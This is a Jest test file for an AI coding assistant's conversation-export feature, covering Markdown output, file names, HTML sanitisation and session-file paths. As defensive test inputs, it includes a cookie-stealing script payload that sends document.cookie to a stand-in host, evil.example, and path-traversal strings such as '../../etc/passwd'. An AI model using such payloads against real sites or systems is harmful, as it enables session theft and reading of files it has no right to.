import { conversationHtml, conversationMarkdown, exportFileName, sessionFile, sessionItems } from '../main/thread.export';

/** Backlog N4: export a conversation as Markdown and PDF. */

const summary = { title: 'Fix the rounding', root: '/Users/me/billing', model: 'openai/gpt-oss-20b' };
const at = new Date(Date.UTC(2026, 8, 21, 10));
const msg = (role: 'user' | 'assistant' | 'system', content: string, level?: string) => ({ kind: 'msg', msg: { id: Math.random().toString(), role, content, level, timestamp: at } }) as any;
const tool = (toolName: string, input: object, status: string, output = '') => ({ kind: 'tool', call: { id: 't', toolName, input: JSON.stringify(input), output, status, startTime: at } }) as any;

test('the words in full, each tool run as one line, and warnings — never tool output or menus', () => {
  const md = conversationMarkdown(summary, [
    msg('user', 'math.js adds wrong. Fix it.'),
    tool('ReadFileTool', { path: 'math.js' }, 'success', 'function add(a, b) {\n  return a - b;\n}'),
    tool('BashTool', { command: 'npm test' }, 'error', 'FAIL test.js\n  expected 5, got -1'),
    msg('system', 'Approved: TOOL_EXECUTION', 'info'),
    msg('system', 'The provider returned an error: rate limited', 'error'),
    msg('assistant', 'Fixed. `add` now returns **a + b**.\n\n- test.js passes'),
  ], at);
  expect(md).toContain('# Fix the rounding');
  expect(md).toContain('Folder: `/Users/me/billing` · Model: `openai/gpt-oss-20b`');
  expect(md).toContain('**You**\n\nmath.js adds wrong. Fix it.');
  expect(md).toContain('**Bimax**\n\nFixed. `add` now returns **a + b**.\n\n- test.js passes');
  expect(md).toContain('> ✓ `ReadFileTool` math.js');
  expect(md).toContain('> ✕ `BashTool` npm test\n> FAIL test.js expected 5, got -1');
  expect(md).toContain('> ⚠ The provider returned an error: rate limited');
  expect(md).not.toContain('return a - b');
  expect(md).not.toContain('Approved: TOOL_EXECUTION');
});

test('a file name any disk accepts, with the date', () => {
  expect(exportFileName('Fix: the/rounding? "now"', 'pdf', at)).toBe('Fix the rounding now 2026-09-21.pdf');
  expect(exportFileName('', 'md', at)).toBe('Bimax conversation 2026-09-21.md');
});

test('the PDF page cannot act: raw HTML is text, and no script or network load is allowed', () => {
  const html = conversationHtml(conversationMarkdown(summary, [
    msg('assistant', 'Here: <script>fetch("https://evil.example/?"+document.cookie)</script> <img src="https://tracker.example/p.gif">'),
  ], at), 'Fix <the> rounding');
  expect(html).toContain(`content="default-src 'none'; style-src 'unsafe-inline'; img-src data:"`);
  expect(html).not.toMatch(/<script>/i);
  expect(html).toContain('&lt;script&gt;');
  expect(html).not.toMatch(/<img[^>]+tracker/);
  expect(html).toContain('<title>Fix &lt;the&gt; rounding</title>');
  expect(html).toContain('<strong>Bimax</strong>');
});

test('a saved session exports like a thread: tool lines, older folded tool calls, and bad lines skipped', () => {
  const jsonl = [
    JSON.stringify({ id: 'm1', role: 'user', content: 'Why does the build fail?', timestamp: '2026-09-12T15:08:20Z' }),
    JSON.stringify({ role: 'tool', id: 't1', toolName: 'BashTool', input: JSON.stringify({ command: 'npm run build' }), output: 'error TS2304', status: 'error' }),
    '{"role": "assistant", "content": "cut off',
    JSON.stringify({ id: 'm2', role: 'assistant', content: 'A missing import.', toolCalls: [{ id: 't0', toolName: 'ReadFileTool', input: JSON.stringify({ path: 'src/a.ts' }), output: 'secret', status: 'success' }] }),
    JSON.stringify({ id: 'm3', role: 'system', level: 'error', content: 'Engine restarted' }),
    '',
  ].join('\n');
  const md = conversationMarkdown({ title: 'Build', root: '/p' }, sessionItems(jsonl), at);
  expect(md).toContain('**You**\n\nWhy does the build fail?');
  expect(md).toContain('> ✕ `BashTool` npm run build\n> error TS2304');
  expect(md).toContain('> ✓ `ReadFileTool` src/a.ts\n\n**Bimax**\n\nA missing import.');
  expect(md).toContain('> ⚠ Engine restarted');
  expect(md).not.toContain('cut off');
  expect(md).not.toContain('secret');
});

test('only a real session id names a file, and only inside the project', () => {
  expect(sessionFile('/p', '2026-09-12_20-38-20')).toBe('/p/.breakglass/sessions/2026-09-12_20-38-20.jsonl');
  expect(sessionFile('/p', '2026-09-12_20-38-20-2')).toBe('/p/.breakglass/sessions/2026-09-12_20-38-20-2.jsonl');
  expect(sessionFile('/p', '../../etc/passwd')).toBeNull();
  expect(sessionFile('/p', '../../2026-09-12_20-38-20')).toBeNull();
  expect(sessionFile('/p', '2026-09-12_20-38-20/../../x')).toBeNull();
  expect(sessionFile('', '2026-09-12_20-38-20')).toBeNull();
});
